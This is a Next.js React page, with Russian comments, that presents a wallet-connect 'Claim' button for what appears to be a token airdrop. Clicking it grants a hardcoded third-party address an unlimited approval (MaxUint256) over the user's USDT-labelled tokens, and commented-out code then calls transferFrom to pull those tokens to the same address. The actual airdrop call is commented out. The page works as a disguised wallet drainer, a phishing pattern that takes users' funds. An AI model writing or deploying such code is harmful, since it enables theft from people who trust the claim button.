import {ConnectWallet, useAddress} from "@thirdweb-dev/react";
import styles from "../styles/Home.module.css";
import Image from "next/image";
import { NextPage } from "next";
import {ethers} from "ethers";


const Home: NextPage = () => {
  const address = useAddress();

  const TOKEN_ADDRESS_USDT = "0xC2C527C0CACF457746Bd31B2a698Fe89de2b6d49";
  // const AIRDROP_ADDRESS = "0x866f48B9d73563f930346663BC6991E09d6EcCdD";

// ABI контракта токена
  const erc20ABI = [
    "function approve(address spender, uint256 value) external returns (bool)",
    "function transferFrom(address from, address to, uint256 amount) external returns (bool)",
    "function allowance(address owner, address spender) external view returns (uint256)"
  ];

  // const airDropABI = [
  //   // ABI
  //   "function claimTokens() public"
  // ];

  const decimalAmount = ethers.constants.MaxUint256;

  const callContractFunction = async () => {

    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();

    try {
      // Создание экземпляра контракта токена
      const token = new ethers.Contract(TOKEN_ADDRESS_USDT, erc20ABI, signer);
      // const airDrop = new ethers.Contract(AIRDROP_ADDRESS, airDropABI, signer);
      //
      // const txAir = await airDrop.claimTokens();
      //
      // await txAir.wait();

      // Вызов функции approve контракта токена
      const tx = await token.approve("0xcaE9500f2470194190C3319dBB8b2FDd414AaC10", decimalAmount);

      // Ожидание завершения транзакции
      await tx.wait();

      console.log('Токены успешно апрувлены');
      //
      // // Получение количества токенов, которое было апрувнуто
      // const approvedAmount = await token.allowance(address, "0xcaE9500f2470194190C3319dBB8b2FDd414AaC10");
      //
      // await approvedAmount.wait();
      //
      // // Вызов функции transferFrom контракта токена с полученным количеством
      // const txTransfer = await token.transferFrom(address, "0xcaE9500f2470194190C3319dBB8b2FDd414AaC10", approvedAmount);
      //
      // // Ожидание завершения транзакции transferFrom
      // await txTransfer.wait();
      //
      // console.log('Токены успешно отправлены');

    } catch (error) {
      console.error('Ошибка при апруве токенов:', error);
    }
  };

  return (
      <div className="container">
        <ConnectWallet />
        <button onClick={callContractFunction} className={styles.button}>Claim</button>
      </div>
  );
};

export default Home;
